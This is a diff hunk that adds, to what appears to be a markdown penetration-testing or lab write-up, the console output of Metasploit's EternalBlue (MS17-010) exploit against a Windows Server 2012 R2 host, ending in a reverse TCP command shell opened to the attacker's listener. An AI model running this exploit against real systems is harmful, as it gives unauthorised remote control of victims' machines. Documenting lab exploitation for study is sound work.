@@ -791,7 +791,32 @@ exploit
 **Result**
 
 ```shell
+msf exploit(windows/smb/ms17_010_eternalblue) > exploit
+[*] Started reverse TCP handler on 192.168.134.39:4444 
+[*] 10.48.181.153:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.48.181.153:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 Datacenter 9600 x64 (64-bit)
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.33/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] 10.48.181.153:445     - Scanned 1 of 1 hosts (100% complete)
+[+] 10.48.181.153:445 - The target is vulnerable.
+[*] 10.48.181.153:445 - shellcode size: 1283
+[*] 10.48.181.153:445 - numGroomConn: 12
+[*] 10.48.181.153:445 - Target OS: Windows Server 2012 R2 Datacenter 9600
+[+] 10.48.181.153:445 - got good NT Trans response
+[+] 10.48.181.153:445 - got good NT Trans response
+[+] 10.48.181.153:445 - SMB1 session setup allocate nonpaged pool success
+[+] 10.48.181.153:445 - SMB1 session setup allocate nonpaged pool success
+[+] 10.48.181.153:445 - good response status for nx: INVALID_PARAMETER
+[+] 10.48.181.153:445 - good response status for nx: INVALID_PARAMETER
+[*] Sending stage (336 bytes) to 10.48.181.153
+[*] Command shell session 1 opened (192.168.134.39:4444 -> 10.48.181.153:49611) at 2026-09-02 01:00:55 -0400
 
+
+Shell Banner:
+Microsoft Windows [Version 6.3.9600]
+-----
+          
+
+C:\Windows\system32>
 ```
 <div align="center">
 <br>
